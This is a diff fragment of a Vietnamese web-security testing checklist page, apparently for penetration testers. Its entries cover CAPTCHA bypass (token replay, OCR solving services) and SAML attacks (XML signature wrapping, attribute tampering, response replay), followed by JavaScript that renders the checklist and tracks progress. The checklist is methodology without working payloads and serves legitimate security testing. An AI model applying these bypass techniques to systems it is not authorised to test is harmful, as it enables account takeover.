+        desc:"CAPTCHA bảo vệ chống automation. Cần kiểm tra: có bypass được không, có rate limit ngoài CAPTCHA không, CAPTCHA có dùng 1 lần không.",
+        steps:[
+          "Submit form mà không có CAPTCHA token",
+          "Replay CAPTCHA token đã dùng",
+          "Có thể bỏ qua bằng cách gọi endpoint phụ?",
+          "CAPTCHA cũ (image text) có dễ giải bằng OCR không"
+        ],
+        tools:["Burp Suite","2captcha","CapMonster"]
+      },
+      {
+        id:"MISC-007", sev:"high", title:"Kiểm thử SSO / SAML",
+        desc:"SAML response signing, XML signature wrapping, SAML response replay, IdP confused deputy.",
+        steps:[
+          "Phân tích SAML response (base64 → XML)",
+          "Sửa attribute (NameID, role) — có bị từ chối do signature không?",
+          "XML signature wrapping (XSW): di chuyển element signed",
+          "Replay SAML response cũ",
+          "Test SAMLRaider extension Burp"
+        ],
+        tools:["SAMLRaider","Burp Suite"]
+      }
+    ]
+  }
+];
+
+// ==================== RENDER ====================
+const SEV_LABELS = {critical:"Nghiêm trọng",high:"Cao",medium:"Trung bình",low:"Thấp",info:"Thông tin"};
+
+function render(){
+  const nav = document.getElementById("navList");
+  const content = document.getElementById("content");
+  let totalItems = 0;
+
+  CATEGORIES.forEach(cat => {
+    // nav
+    const li = document.createElement("li");
+    li.innerHTML = `<a href="#${cat.id}" data-target="${cat.id}">${cat.title}</a>`;
+    nav.appendChild(li);
+
+    // section
+    const section = document.createElement("section");
+    section.className = "category";
+    section.id = cat.id;
+
+    let html = `<h2>${cat.title}</h2>
+    <div class="cat-id">[${cat.code}]</div>
+    <div class="cat-desc">${cat.desc}</div>`;
+
+    cat.items.forEach(item => {
+      totalItems++;
+      const stepsHtml = item.steps ? `<h4>Các bước thực hiện</h4><ol>${item.steps.map(s=>`<li>${s}</li>`).join("")}</ol>` : "";
+      const toolsHtml = item.tools ? `<h4>Công cụ gợi ý</h4><div class="tools">${item.tools.map(t=>`<span>${t}</span>`).join("")}</div>` : "";
+
+      html += `<div class="item" data-id="${item.id}" data-search="${(item.title+" "+item.desc+" "+(item.steps||[]).join(" ")).toLowerCase()}">
+        <div class="item-header">
+          <input type="checkbox" data-id="${item.id}" />
+          <div class="h-text">
+            <h3>${item.title}</h3>
+            <div>
+              <span class="item-id">${item.id}</span>
+              <span class="severity sev-${item.sev}">${SEV_LABELS[item.sev]}</span>
+            </div>
+          </div>
+        </div>
+        <div class="body">
+          <h4>Mô tả</h4>
+          <p>${item.desc}</p>
+          ${stepsHtml}
+          ${toolsHtml}
+        </div>
+      </div>`;
+    });
+
+    section.innerHTML = html;
+    content.appendChild(section);
+  });
+
+  // restore checkbox state
+  document.querySelectorAll('input[type=checkbox][data-id]').forEach(cb => {
+    const saved = localStorage.getItem("chk_"+cb.dataset.id);
+    if(saved === "1"){
+      cb.checked = true;
+      cb.closest(".item").classList.add("checked");
+    }
+    cb.addEventListener("change", () => {
+      localStorage.setItem("chk_"+cb.dataset.id, cb.checked ? "1" : "0");
+      cb.closest(".item").classList.toggle("checked", cb.checked);
+      updateProgress();
+    });
+  });
+
+  window._totalItems = totalItems;
+  updateProgress();
+  setupSearch();
+  setupNavHighlight();
+}
+
+function updateProgress(){
+  const total = window._totalItems;
+  const checked = document.querySelectorAll('input[type=checkbox][data-id]:checked').length;
+  const pct = total ? Math.round(checked/total*100) : 0;
+  document.getElementById("progressFill").style.width = pct + "%";
+  document.getElementById("progressText").textContent = `${checked} / ${total} (${pct}%)`;
+}
+
+function resetAll(){
+  if(!confirm("Xóa toàn bộ tiến độ kiểm tra?")) return;
+  document.querySelectorAll('input[type=checkbox][data-id]').forEach(cb => {
+    cb.checked = false;
+    cb.closest(".item").classList.remove("checked");
+    localStorage.removeItem("chk_"+cb.dataset.id);
+  });
+  updateProgress();
+}
+
+function expandAll(){
+  document.querySelectorAll(".item .body").forEach(b => b.style.display = "block");
+}
+
+function setupSearch(){
+  const input = document.getElementById("searchInput");
+  input.addEventListener("input", () => {
+    const q = input.value.toLowerCase().trim();
+    document.querySelectorAll(".item").forEach(item => {
+      const text = item.dataset.search;
+      item.classList.toggle("hidden", q && !text.includes(q));
+    });
+    document.querySelectorAll("section.category").forEach(sec => {
+      const visible = sec.querySelectorAll(".item:not(.hidden)").length;
+      sec.classList.toggle("hidden", q && visible === 0);
+    });
+  });
+}
+
+function setupNavHighlight(){
+  const links = document.querySelectorAll(".sidebar ol li a");
+  const sections = Array.from(document.querySelectorAll("section.category"));
+  window.addEventListener("scroll", () => {
+    let active = null;
+    for(const sec of sections){
+      const r = sec.getBoundingClientRect();
+      if(r.top < 200) active = sec.id;
+    }
+    links.forEach(a => a.classList.toggle("active", a.dataset.target === active));
+  });
+}
+
+render();
+</script>
+</body>
+</html>
